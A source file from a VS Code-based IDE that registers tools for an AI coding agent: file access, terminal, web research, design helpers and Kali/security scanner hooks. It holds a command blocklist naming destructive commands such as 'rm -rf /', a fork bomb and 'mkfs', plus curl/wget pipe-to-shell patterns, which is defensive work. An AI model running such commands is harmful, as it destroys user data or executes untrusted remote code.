/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/
// Copyright (c) 2025 Razisafir. All rights reserved.
// Kovix proprietary code. See LICENSE.txt for proprietary license terms.

import { Disposable } from '../../../../../../base/common/lifecycle.js';
import { URI } from '../../../../../../base/common/uri.js';
import { VSBuffer } from '../../../../../../base/common/buffer.js';
import { ILogService } from '../../../../../../platform/log/common/log.js';
import { INotificationService } from '../../../../../../platform/notification/common/notification.js';
import { IConfigurationService } from '../../../../../../platform/configuration/common/configuration.js';
import { IFileService } from '../../../../../../platform/files/common/files.js';
import { IWorkspaceContextService } from '../../../../../../platform/workspace/common/workspace.js';
import { IConstructVectorStore } from '../../../../../../platform/construct/common/memory/vectorStore.js';
import {
        IConstructToolRegistry, IToolDefinition, IToolResult, assertWithinWorkspace
} from '../../../../../../platform/construct/common/tools/constructToolRegistry.js';
import { ITerminalExecutor, isInterpreterCommand } from '../../../../../../platform/construct/common/terminal/terminalExecutor.js';
import { IPendingChangesService } from '../../../../../../platform/construct/common/diff/pendingChanges.js';
// SEC-7 (H4 follow-up): Modal confirmation dialog for interpreter commands.
import { IDialogService } from '../../../../../../platform/dialogs/common/dialogs.js';
import Severity from '../../../../../../base/common/severity.js';
import { nmapToolDefinition } from '../../tools/security/nmapTool.js';
import { ghidraToolDefinition } from '../../tools/security/ghidraTool.js';
import { nucleiToolDefinition } from '../../tools/security/nucleiTool.js';
// Browser-safe path utilities
import * as pathModule from '../../../../../../base/common/path.js';

const MAX_OUTPUT_LENGTH = 100_000; // Characters
const COMMAND_BLOCKLIST = [
        'rm -rf /', 'format c:', 'del /s /q c:\\', 'mkfs', 'dd if=',
        ':(){ :|:& };:', 'wget.*|.*sh', 'curl.*|.*sh',
        'shutdown', 'reboot', 'halt', 'poweroff',
        'sudo rm', 'chmod -R 777 /', 'chown -R',
];

/**
 * ConstructToolRegistryService — implementation of the tool registry with built-in tools.
 *
 * Built-in tools:
 * - read_file(path) — read file from workspace
 * - write_file(path, content) — write with diff preview before applying
 * - run_terminal(command) — execute in node-pty, stream output to panel
 * - run_command(command, cwd) — alias for run_terminal with agent-compatible schema
 * - search_codebase(query) — semantic search via Qdrant vector store
 * - web_search(query) — only when online mode active
 * - list_directory(path) — list directory contents
 * - create_directory(path) — create a directory including parents
 * - edit_file(path, diff) — apply a unified diff to an existing file (staged for review)
 *
 * Kali integration:
 * - On Windows, detect Kali WSL2 distro via: wsl.exe -l -v
 * - If found, add a "Kali Terminal" profile in the terminal dropdown
 * - Route run_terminal to Kali shell when user has selected Kali profile
 *
 * OFFLINE FIRST:
 * - read_file, write_file, run_terminal, search_codebase work offline
 * - web_search only works when online mode is enabled
 * - Kali WSL is only available on Windows with WSL2 installed
 *
 * USER IN CONTROL:
 * - write_file always shows a diff preview and waits for approval
 * - Terminal commands are checked against a blocklist
 * - All file modifications require explicit user consent
 */
export class ConstructToolRegistryService extends Disposable implements IConstructToolRegistry {
        readonly _serviceBrand: undefined;

        private readonly _tools: Map<string, { definition: IToolDefinition; executeFn: (input: Record<string, unknown>, signal?: AbortSignal) => Promise<IToolResult> }> = new Map();
        private _terminalProfile: string = 'default';
        private _kaliAvailable: boolean = false;
        private _onlineMode: boolean = false;

        constructor(
                @ILogService private readonly logService: ILogService,
                @INotificationService _notificationService: INotificationService,
                @IConfigurationService private readonly _configurationService: IConfigurationService,
                @IFileService private readonly fileService: IFileService,
                @IWorkspaceContextService private readonly workspaceContextService: IWorkspaceContextService,
                @IConstructVectorStore private readonly vectorStore: IConstructVectorStore,
                @ITerminalExecutor private readonly terminalExecutor: ITerminalExecutor,
                @IPendingChangesService private readonly pendingChanges: IPendingChangesService,
                @IDialogService private readonly dialogService: IDialogService,
        ) {
                super();

                // Register built-in tools
                this.registerBuiltinTools();

                // Check online mode
                this._onlineMode = _configurationService.getValue<boolean>('kovix.onlineMode') ?? false;
                this._register(_configurationService.onDidChangeConfiguration(e => {
                        if (e.affectsConfiguration('kovix.onlineMode')) {
                                this._onlineMode = _configurationService.getValue<boolean>('kovix.onlineMode') ?? false;
                        }
                }));

                // Check for Kali WSL2 (async, non-blocking)
                this.checkKaliWSL();

                // Security tools — gated by kovix.enableSecurityTools setting
                const enableSecurityTools = this._configurationService.getValue<boolean>('kovix.enableSecurityTools');
                if (enableSecurityTools !== false) {
                        this.registerSecurityTools();
                }

                this.logService.info('[ToolRegistry] Initialized with ' + this._tools.size + ' built-in tools');
        }

        listTools(): IToolDefinition[] {
                return Array.from(this._tools.values()).map(t => t.definition);
        }

        getTool(name: string): IToolDefinition | undefined {
                return this._tools.get(name)?.definition;
        }

        async execute(name: string, input: Record<string, unknown>, signal?: AbortSignal): Promise<IToolResult> {
                const tool = this._tools.get(name);
                if (!tool) {
                        return { success: false, output: `Unknown tool: ${name}`, truncated: false };
                }

                // Check if tool requires network and we're offline
                if (tool.definition.requiresNetwork && !this._onlineMode) {
                        return {
                                success: false,
                                output: `Tool "${name}" requires network access, but offline mode is active. Enable online mode in settings to use this tool.`,
                                truncated: false,
                        };
                }

                const startTime = Date.now();
                try {
                        const result = await tool.executeFn(input, signal);
                        result.metadata = {
                                ...result.metadata,
                                durationMs: Date.now() - startTime,
                        };
                        return result;
                } catch (error) {
                        return {
                                success: false,
                                output: `Tool execution failed: ${error instanceof Error ? error.message : String(error)}`,
                                truncated: false,
                                metadata: { durationMs: Date.now() - startTime },
                        };
                }
        }

        registerTool(tool: IToolDefinition, executeFn: (input: Record<string, unknown>, signal?: AbortSignal) => Promise<IToolResult>): void {
                if (this._tools.has(tool.name)) {
                        this.logService.warn('[ToolRegistry] Tool already registered: ' + tool.name + '. Overwriting.');
                }
                this._tools.set(tool.name, { definition: tool, executeFn });
                this.logService.info('[ToolRegistry] Registered tool: ' + tool.name);
        }

        unregisterTool(name: string): void {
                this._tools.delete(name);
                this.logService.info('[ToolRegistry] Unregistered tool: ' + name);
        }

        async isKaliWSLAvailable(): Promise<boolean> {
                return this._kaliAvailable;
        }

        getTerminalProfile(): string {
                return this._terminalProfile;
        }

        setTerminalProfile(profile: string): void {
                this._terminalProfile = profile;
                this.logService.info('[ToolRegistry] Terminal profile set to: ' + profile);
        }

        // --- Built-in Tool Registration ---

        private registerBuiltinTools(): void {
                // read_file — read a file from the workspace
                this.registerTool({
                        name: 'read_file',
                        description: 'Read the contents of a file from the workspace. Returns the file content as a string.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        path: {
                                                type: 'string',
                                                description: 'Absolute or workspace-relative path to the file to read.',
                                        },
                                },
                                required: ['path'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: false,
                        category: 'file',
                }, async (input) => this.executeReadFile(input));

                // write_file — write content to a file (with diff preview)
                this.registerTool({
                        name: 'write_file',
                        description: 'Write content to a file. Shows a diff preview and requires user approval before applying. Creates the file if it does not exist.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        path: {
                                                type: 'string',
                                                description: 'Absolute or workspace-relative path to the file to write.',
                                        },
                                        content: {
                                                type: 'string',
                                                description: 'The content to write to the file.',
                                        },
                                        mode: {
                                                type: 'string',
                                                description: 'Write mode: "overwrite" replaces the file, "append" adds to the end, "create_only" fails if the file already exists.',
                                                enum: ['overwrite', 'append', 'create_only'],
                                                default: 'overwrite',
                                        },
                                },
                                required: ['path', 'content'],
                        },
                        modifiesFiles: true,
                        requiresNetwork: false,
                        category: 'file',
                }, async (input) => this.executeWriteFile(input));

                // run_terminal — execute a command in the terminal
                this.registerTool({
                        name: 'run_terminal',
                        description: 'Execute a command in the terminal. Commands are checked against a blocklist for safety. When Kali WSL profile is selected, commands run in Kali Linux.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        command: {
                                                type: 'string',
                                                description: 'The command to execute.',
                                        },
                                        cwd: {
                                                type: 'string',
                                                description: 'Working directory for the command. Defaults to workspace root.',
                                        },
                                        timeout: {
                                                type: 'number',
                                                description: 'Timeout in seconds. Defaults to 30.',
                                        },
                                },
                                required: ['command'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: false,
                        category: 'terminal',
                }, async (input) => this.executeRunTerminal(input));

                // search_codebase — semantic search via Qdrant
                this.registerTool({
                        name: 'search_codebase',
                        description: 'Search the codebase using semantic similarity. Returns the most relevant code chunks from the workspace. Requires Qdrant to be running.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        query: {
                                                type: 'string',
                                                description: 'The search query. Describe what you are looking for in natural language.',
                                        },
                                        topK: {
                                                type: 'number',
                                                description: 'Number of results to return. Defaults to 8.',
                                        },
                                },
                                required: ['query'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: false,
                        category: 'search',
                }, async (input) => this.executeSearchCodebase(input));

                // web_search — search the web (only when online)
                this.registerTool({
                        name: 'web_search',
                        description: 'Search the web for information. Only available when online mode is enabled. Returns search results with URLs and snippets.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        query: {
                                                type: 'string',
                                                description: 'The search query.',
                                        },
                                        num: {
                                                type: 'number',
                                                description: 'Number of results to return. Defaults to 10.',
                                        },
                                },
                                required: ['query'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: true,
                        category: 'network',
                }, async (input) => this.executeWebSearch(input));

                // list_directory — list directory contents
                this.registerTool({
                        name: 'list_directory',
                        description: 'List the contents of a directory. Returns file and directory names within the specified path.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        path: {
                                                type: 'string',
                                                description: 'Absolute or workspace-relative path to the directory to list.',
                                        },
                                        recursive: {
                                                type: 'boolean',
                                                description: 'Whether to list contents recursively. Defaults to false.',
                                        },
                                },
                                required: ['path'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: false,
                        category: 'file',
                }, async (input) => this.executeListDirectory(input));

                // create_directory — create a directory, including any necessary parent directories
                this.registerTool({
                        name: 'create_directory',
                        description: 'Create a directory, including any necessary parent directories. Returns confirmation of creation.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        path: {
                                                type: 'string',
                                                description: 'Absolute or workspace-relative path to the directory to create.',
                                        },
                                },
                                required: ['path'],
                        },
                        modifiesFiles: true,
                        requiresNetwork: false,
                        category: 'file',
                }, async (input) => this.executeCreateDirectory(input));

                // edit_file — apply a unified diff to an existing file (staged for user review)
                this.registerTool({
                        name: 'edit_file',
                        description: 'Apply a unified diff to an existing file. Use for targeted edits rather than rewriting entire files. The change is staged for user review before applying.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        path: {
                                                type: 'string',
                                                description: 'Absolute or workspace-relative path to the file to edit.',
                                        },
                                        diff: {
                                                type: 'string',
                                                description: 'Unified diff content to apply to the file.',
                                        },
                                },
                                required: ['path', 'diff'],
                        },
                        modifiesFiles: true,
                        requiresNetwork: false,
                        category: 'file',
                }, async (input) => this.executeEditFile(input));

                // run_command — alias for run_terminal with agent-compatible input schema
                // This ensures the tool registry can handle both 'run_terminal' and 'run_command' names
                this.registerTool({
                        name: 'run_command',
                        description: 'Execute a shell command and return the output. Use for installing dependencies, running builds, tests, etc. Commands are checked against a blocklist for safety.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        command: {
                                                type: 'string',
                                                description: 'The shell command to execute.',
                                        },
                                        cwd: {
                                                type: 'string',
                                                description: 'Working directory for the command. Defaults to workspace root.',
                                        },
                                },
                                required: ['command'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: false,
                        category: 'terminal',
                }, async (input) => this.executeRunTerminal(input));

                // ===== Agent Reach — Internet Research Tools =====
                // These proxy to the agent-reach MCP server but are registered natively
                // so the LLM knows about them even without MCP enabled.

                // 1. agent_reach__read_webpage — read and extract content from a webpage
                this.registerTool({
                        name: 'agent_reach__read_webpage',
                        description: 'Read and extract the main content from a webpage URL. Returns the cleaned article text, title, and metadata. Supports most websites including news, blogs, docs, and forums.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        url: {
                                                type: 'string',
                                                description: 'The full URL of the webpage to read (e.g., https://example.com/article).',
                                        },
                                },
                                required: ['url'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: true,
                        category: 'network',
                }, async (input) => this.executeAgentReachTool('agent_reach__read_webpage', input));

                // 2. agent_reach__search_youtube — search YouTube videos
                this.registerTool({
                        name: 'agent_reach__search_youtube',
                        description: 'Search YouTube for videos matching a query. Returns video titles, URLs, channel names, view counts, and publish dates.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        query: {
                                                type: 'string',
                                                description: 'Search query for YouTube videos.',
                                        },
                                        max_results: {
                                                type: 'number',
                                                description: 'Maximum number of results to return. Defaults to 5.',
                                                default: 5,
                                        },
                                },
                                required: ['query'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: true,
                        category: 'network',
                }, async (input) => this.executeAgentReachTool('agent_reach__search_youtube', input));

                // 3. agent_reach__get_youtube_transcript — get transcript of a YouTube video
                this.registerTool({
                        name: 'agent_reach__get_youtube_transcript',
                        description: 'Fetch the transcript/subtitles of a YouTube video. Returns the full transcript text with timestamps. Useful for summarizing video content.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        video_id: {
                                                type: 'string',
                                                description: 'The YouTube video ID (e.g., "dQw4w9WgXcQ" from https://www.youtube.com/watch?v=dQw4w9WgXcQ).',
                                        },
                                },
                                required: ['video_id'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: true,
                        category: 'network',
                }, async (input) => this.executeAgentReachTool('agent_reach__get_youtube_transcript', input));

                // 4. agent_reach__search_bilibili — search Bilibili videos
                this.registerTool({
                        name: 'agent_reach__search_bilibili',
                        description: 'Search Bilibili (Chinese video platform) for videos. Returns video titles, URLs, uploader names, view counts, and descriptions.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        query: {
                                                type: 'string',
                                                description: 'Search query for Bilibili videos.',
                                        },
                                        max_results: {
                                                type: 'number',
                                                description: 'Maximum number of results to return. Defaults to 5.',
                                                default: 5,
                                        },
                                },
                                required: ['query'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: true,
                        category: 'network',
                }, async (input) => this.executeAgentReachTool('agent_reach__search_bilibili', input));

                // 5. agent_reach__search_github — search GitHub repositories, code, issues, and users
                this.registerTool({
                        name: 'agent_reach__search_github',
                        description: 'Search GitHub for repositories, code, issues, pull requests, or users. Returns relevant results with URLs, descriptions, stars, and metadata.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        query: {
                                                type: 'string',
                                                description: 'Search query for GitHub. Can use GitHub search syntax (e.g., "language:typescript stars:>100").',
                                        },
                                        type: {
                                                type: 'string',
                                                description: 'Type of search: "repositories", "code", "issues", "pull_requests", or "users". Defaults to "repositories".',
                                                enum: ['repositories', 'code', 'issues', 'pull_requests', 'users'],
                                                default: 'repositories',
                                        },
                                        max_results: {
                                                type: 'number',
                                                description: 'Maximum number of results to return. Defaults to 5.',
                                                default: 5,
                                        },
                                },
                                required: ['query'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: true,
                        category: 'network',
                }, async (input) => this.executeAgentReachTool('agent_reach__search_github', input));

                // 6. agent_reach__search_twitter — search Twitter/X tweets
                this.registerTool({
                        name: 'agent_reach__search_twitter',
                        description: 'Search Twitter/X for tweets matching a query. Returns tweets with author, text, timestamp, likes, retweets, and URLs.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        query: {
                                                type: 'string',
                                                description: 'Search query for Twitter/X. Supports Twitter search operators.',
                                        },
                                        max_results: {
                                                type: 'number',
                                                description: 'Maximum number of results to return. Defaults to 10.',
                                                default: 10,
                                        },
                                },
                                required: ['query'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: true,
                        category: 'network',
                }, async (input) => this.executeAgentReachTool('agent_reach__search_twitter', input));

                // 7. agent_reach__search_reddit — search Reddit posts and comments
                this.registerTool({
                        name: 'agent_reach__search_reddit',
                        description: 'Search Reddit for posts and comments. Returns post titles, subreddit, author, score, comment count, and URLs.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        query: {
                                                type: 'string',
                                                description: 'Search query for Reddit.',
                                        },
                                        subreddit: {
                                                type: 'string',
                                                description: 'Optional subreddit to limit search to (e.g., "programming").',
                                        },
                                        max_results: {
                                                type: 'number',
                                                description: 'Maximum number of results to return. Defaults to 5.',
                                                default: 5,
                                        },
                                },
                                required: ['query'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: true,
                        category: 'network',
                }, async (input) => this.executeAgentReachTool('agent_reach__search_reddit', input));

                // 8. agent_reach__search_xiaohongshu — search Xiaohongshu (Little Red Book) posts
                this.registerTool({
                        name: 'agent_reach__search_xiaohongshu',
                        description: 'Search Xiaohongshu (Little Red Book / RED) for posts. Returns post titles, content excerpts, author, likes, and URLs.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        query: {
                                                type: 'string',
                                                description: 'Search query for Xiaohongshu (Chinese or English).',
                                        },
                                        max_results: {
                                                type: 'number',
                                                description: 'Maximum number of results to return. Defaults to 5.',
                                                default: 5,
                                        },
                                },
                                required: ['query'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: true,
                        category: 'network',
                }, async (input) => this.executeAgentReachTool('agent_reach__search_xiaohongshu', input));

                // 9. agent_reach__search_exa — search using Exa AI (neural search engine)
                this.registerTool({
                        name: 'agent_reach__search_exa',
                        description: 'Search the web using Exa AI, a neural search engine that finds semantically relevant results. Returns high-quality web pages with content summaries.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        query: {
                                                type: 'string',
                                                description: 'Natural language search query. Exa understands meaning, not just keywords.',
                                        },
                                        max_results: {
                                                type: 'number',
                                                description: 'Maximum number of results to return. Defaults to 5.',
                                                default: 5,
                                        },
                                },
                                required: ['query'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: true,
                        category: 'network',
                }, async (input) => this.executeAgentReachTool('agent_reach__search_exa', input));

                // 10. agent_reach__read_rss — read and parse RSS feeds
                this.registerTool({
                        name: 'agent_reach__read_rss',
                        description: 'Read and parse an RSS or Atom feed. Returns feed title, description, and recent entries with titles, summaries, publish dates, and links.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        url: {
                                                type: 'string',
                                                description: 'The RSS or Atom feed URL to read.',
                                        },
                                        max_entries: {
                                                type: 'number',
                                                description: 'Maximum number of entries to return. Defaults to 10.',
                                                default: 10,
                                        },
                                },
                                required: ['url'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: true,
                        category: 'network',
                }, async (input) => this.executeAgentReachTool('agent_reach__read_rss', input));

                // 11. agent_reach__doctor — diagnose and fix MCP/Agent Reach connection issues
                this.registerTool({
                        name: 'agent_reach__doctor',
                        description: 'Diagnose and fix Agent Reach MCP server connection issues. Runs health checks on the MCP server, network connectivity, and configuration. Returns diagnostic report and suggested fixes.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        fix: {
                                                type: 'boolean',
                                                description: 'Whether to attempt automatic fixes. Defaults to false (diagnostic only).',
                                                default: false,
                                        },
                                },
                        },
                        modifiesFiles: false,
                        requiresNetwork: true,
                        category: 'network',
                }, async (input) => this.executeAgentReachTool('agent_reach__doctor', input));

                // ===== UI-UX Pro Max — Design Intelligence Tools =====
                // These proxy to the UI-UX Pro Max Python engine for design system generation

                // 1. uiux_pro_max__search_style — Search UI styles
                this.registerTool({
                        name: 'uiux_pro_max__search_style',
                        description: 'Search UI/UX styles by keyword. Returns matching styles from 67 UI styles including Minimalism, Glassmorphism, Brutalism, Neumorphism, Aurora, Flat Design, and more. Each result includes style category, keywords, primary colors, effects, animation recommendations, best use cases, framework compatibility, and implementation checklist.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        query: {
                                                type: 'string',
                                                description: 'Search query for UI styles (e.g., "glassmorphism dashboard", "minimalist SaaS", "dark mode gaming")',
                                        },
                                        max_results: {
                                                type: 'number',
                                                description: 'Maximum number of results to return (1-10, default: 3)',
                                                default: 3,
                                        },
                                },
                                required: ['query'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: false,
                        category: 'design',
                }, async (input) => this.executeUiuxProMaxTool('uiux_search_style', input));

                // 2. uiux_pro_max__search_color — Search color palettes
                this.registerTool({
                        name: 'uiux_pro_max__search_color',
                        description: 'Search color palettes by product type, mood, or keyword. Returns matching palettes from 161 curated color schemes. Each result includes primary, secondary, accent, background, foreground, muted, border, destructive, and ring colors with hex values and CSS variable names.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        query: {
                                                type: 'string',
                                                description: 'Search query for color palettes (e.g., "SaaS blue", "fintech professional", "healthcare calming", "gaming neon")',
                                        },
                                        max_results: {
                                                type: 'number',
                                                description: 'Maximum number of results to return (1-10, default: 3)',
                                                default: 3,
                                        },
                                },
                                required: ['query'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: false,
                        category: 'design',
                }, async (input) => this.executeUiuxProMaxTool('uiux_search_color', input));

                // 3. uiux_pro_max__search_typography — Search font pairings
                this.registerTool({
                        name: 'uiux_pro_max__search_typography',
                        description: 'Search font pairings by mood, style, or use case. Returns matching pairings from 57 curated heading/body font combinations. Each result includes font names, category, mood keywords, best use cases, Google Fonts URL, CSS import code, and Tailwind config.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        query: {
                                                type: 'string',
                                                description: 'Search query for font pairings (e.g., "modern serif heading", "clean sans-serif", "playful startup", "elegant luxury")',
                                        },
                                        max_results: {
                                                type: 'number',
                                                description: 'Maximum number of results to return (1-10, default: 3)',
                                                default: 3,
                                        },
                                },
                                required: ['query'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: false,
                        category: 'design',
                }, async (input) => this.executeUiuxProMaxTool('uiux_search_typography', input));

                // 4. uiux_pro_max__generate_design_system — Generate complete design system
                this.registerTool({
                        name: 'uiux_pro_max__generate_design_system',
                        description: 'Generate a complete design system recommendation. Multi-domain search + reasoning produces a full design system with pattern structure, style recommendation, color palette with hex values, typography pairing, key effects, anti-patterns to avoid, and pre-delivery checklist. Optionally persists to design-system/MASTER.md.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        query: {
                                                type: 'string',
                                                description: 'Description of the project (e.g., "SaaS dashboard", "e-commerce luxury store", "fintech mobile app")',
                                        },
                                        project_name: {
                                                type: 'string',
                                                description: 'Project name for output. Defaults to query.',
                                                default: 'Project',
                                        },
                                        format: {
                                                type: 'string',
                                                description: 'Output format: ascii or markdown. Default: markdown',
                                                enum: ['ascii', 'markdown'],
                                                default: 'markdown',
                                        },
                                        persist: {
                                                type: 'boolean',
                                                description: 'Save to design-system/MASTER.md. Default: false',
                                                default: false,
                                        },
                                },
                                required: ['query'],
                        },
                        modifiesFiles: true,
                        requiresNetwork: false,
                        category: 'design',
                }, async (input) => this.executeUiuxProMaxTool('uiux_generate_design_system', input));

                // 5. uiux_pro_max__get_stack_guidelines — Get framework-specific guidelines
                this.registerTool({
                        name: 'uiux_pro_max__get_stack_guidelines',
                        description: 'Get framework-specific UI guidelines for a tech stack. Searches stack data for 16 frameworks: react, nextjs, vue, svelte, astro, swiftui, react-native, flutter, nuxtjs, nuxt-ui, html-tailwind, shadcn, jetpack-compose, threejs, angular, laravel. Returns component structure, styling, animation, accessibility, and performance guidelines.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        query: {
                                                type: 'string',
                                                description: 'Search query (e.g., "component structure", "styling patterns", "animation")',
                                        },
                                        stack: {
                                                type: 'string',
                                                description: 'Tech stack: react, nextjs, vue, svelte, astro, swiftui, react-native, flutter, nuxtjs, nuxt-ui, html-tailwind, shadcn, jetpack-compose, threejs, angular, laravel',
                                        },
                                        max_results: {
                                                type: 'number',
                                                description: 'Max results (1-10, default: 3)',
                                                default: 3,
                                        },
                                },
                                required: ['query', 'stack'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: false,
                        category: 'design',
                }, async (input) => this.executeUiuxProMaxTool('uiux_get_stack_guidelines', input));

                // ===== Ponytail — Lazy Senior Developer Tools =====
                // These proxy to the ponytail MCP server but are registered natively
                // so the LLM knows about them even without MCP enabled.

                // 1. ponytail_set_mode — set lazy-dev intensity
                this.registerTool({
                        name: 'ponytail_set_mode',
                        description: 'Set the Ponytail lazy-developer intensity level (lite/full/ultra/off) or get the current mode. Modes: lite (suggest lazier alternatives), full (enforce the decision ladder — default), ultra (YAGNI extremist), off (disable). Mode persists across sessions.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        mode: {
                                                type: 'string',
                                                description: 'Intensity level: "lite", "full", "ultra", or "off". Omit to get current mode.',
                                                enum: ['lite', 'full', 'ultra', 'off'],
                                        },
                                },
                        },
                        modifiesFiles: false,
                        requiresNetwork: false,
                        category: 'behavior',
                }, async (input) => this.executePonytailTool('ponytail_set_mode', input));

                // 2. ponytail_review_code — review for over-engineering
                this.registerTool({
                        name: 'ponytail_review_code',
                        description: 'Review code for over-engineering using Ponytail rules. Returns review guidelines with tags: delete: (dead code), stdlib: (hand-rolled stdlib), native: (dependency doing what platform does), yagni: (one-implementation abstraction), shrink: (fewer lines possible). One finding per line.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        code: {
                                                type: 'string',
                                                description: 'The code to review for over-engineering.',
                                        },
                                        file_path: {
                                                type: 'string',
                                                description: 'Path to the file being reviewed (for context).',
                                                default: 'current file',
                                        },
                                },
                                required: ['code'],
                        },
                        modifiesFiles: false,
                        requiresNetwork: false,
                        category: 'behavior',
                }, async (input) => this.executePonytailTool('ponytail_review_code', input));

                // 3. ponytail_audit_repo — audit codebase for bloat
                this.registerTool({
                        name: 'ponytail_audit_repo',
                        description: 'Audit an entire codebase for over-engineering (bloat, unnecessary abstractions, dead code, reinvention). Returns a ranked list of what to delete, simplify, or replace with stdlib/native equivalents.',
                        inputSchema: {
                                type: 'object',
                                properties: {
                                        repo_path: {
                                                type: 'string',
                                                description: 'Root path of the repository to audit. Defaults to current workspace.',
                                                default: '.',
                                        },
                                },
                        },
                        modifiesFiles: false,
                        requiresNetwork: false,
                        category: 'behavior',
                }, async (input) => this.executePonytailTool('ponytail_audit_repo', input));

                // 4. ponytail_get_rules — get current ruleset
                this.registerTool({
                        name: 'ponytail_get_rules',
                        description: 'Get the full Ponytail ruleset for the current mode. Returns the complete behavioral guidelines including the decision ladder (YAGNI → stdlib → native → deps → one line → minimum), rules, output format, and intensity levels.',
                        inputSchema: {
                                type: 'object',
                                properties: {},
                        },
                        modifiesFiles: false,
                        requiresNetwork: false,
                        category: 'behavior',
                }, async (input) => this.executePonytailTool('ponytail_get_rules', input));

                // 5. ponytail_help — quick reference
                this.registerTool({
                        name: 'ponytail_help',
                        description: 'Show the Ponytail quick-reference card: modes (lite/full/ultra/off), skills, commands, deactivation, and configuration.',
                        inputSchema: {
                                type: 'object',
                                properties: {},
                        },
                        modifiesFiles: false,
                        requiresNetwork: false,
                        category: 'behavior',
                }, async (input) => this.executePonytailTool('ponytail_help', input));
        }

        // --- Tool Implementations ---

        private async executeReadFile(input: Record<string, unknown>): Promise<IToolResult> {
                const path = input.path as string;
                if (!path) {
                        return { success: false, output: 'Missing required parameter: path', truncated: false };
                }

                try {
                        // SEC-4: Path traversal prevention
                        const workspaceRoot = this.workspaceContextService.getWorkspace().folders[0]?.uri.fsPath;
                        if (workspaceRoot) {
                                assertWithinWorkspace(path, workspaceRoot);
                        }

                        const uri = this.resolveUri(path);
                        const content = await this.fileService.readFile(uri);
                        const text = content.value.toString();

                        const truncated = text.length > MAX_OUTPUT_LENGTH;
                        const output = truncated ? text.substring(0, MAX_OUTPUT_LENGTH) + '\n... [truncated]' : text;

                        return {
                                success: true,
                                output,
                                truncated,
                                metadata: { bytesProcessed: text.length },
                        };
                } catch (error) {
                        return {
                                success: false,
                                output: `Failed to read file "${path}": ${error instanceof Error ? error.message : String(error)}`,
                                truncated: false,
                        };
                }
        }

        private async executeWriteFile(input: Record<string, unknown>): Promise<IToolResult> {
                const path = input.path as string;
                const content = input.content as string;
                const mode = (input.mode as string) ?? 'overwrite';

                if (!path || content === undefined) {
                        return { success: false, output: 'Missing required parameters: path and content', truncated: false };
                }

                // USER IN CONTROL: The agent view's diff viewer handles the approval flow.
                // This tool writes the content after approval has been granted by the user.
                // The agent loop must show a diff and wait for approval before calling this.
                try {
                        // SEC-4: Path traversal prevention
                        const workspaceRoot = this.workspaceContextService.getWorkspace().folders[0]?.uri.fsPath;
                        if (workspaceRoot) {
                                assertWithinWorkspace(path, workspaceRoot);
                        }

                        const uri = this.resolveUri(path);

                        if (mode === 'create_only') {
                                // Check if file exists first; if yes, return error
                                const exists = await this.fileService.exists(uri);
                                if (exists) {
                                        return {
                                                success: false,
                                                output: `File already exists: ${path}. Use mode "overwrite" or "append" instead.`,
                                                truncated: false,
                                        };
                                }
                        }

                        let contentToWrite = content;

                        if (mode === 'append') {
                                // Read existing content, append new content
                                try {
                                        const existing = await this.fileService.readFile(uri);
                                        const existingText = existing.value.toString();
                                        contentToWrite = existingText + content;
                                } catch {
                                        // File doesn't exist yet — just write the content as-is
                                }
                        }

                        const encoded = VSBuffer.wrap(new TextEncoder().encode(contentToWrite));
                        await this.fileService.writeFile(uri, encoded);

                        return {
                                success: true,
                                output: `File written: ${path} (${contentToWrite.length} bytes, mode: ${mode})`,
                                truncated: false,
                                metadata: { bytesProcessed: contentToWrite.length },
                        };
                } catch (error) {
                        return {
                                success: false,
                                output: `Failed to write file "${path}": ${error instanceof Error ? error.message : String(error)}`,
                                truncated: false,
                        };
                }
        }

        private async executeRunTerminal(input: Record<string, unknown>): Promise<IToolResult> {
                const command = input.command as string;
                if (!command) {
                        return { success: false, output: 'Missing required parameter: command', truncated: false };
                }

                // Check command against blocklist
                for (const pattern of COMMAND_BLOCKLIST) {
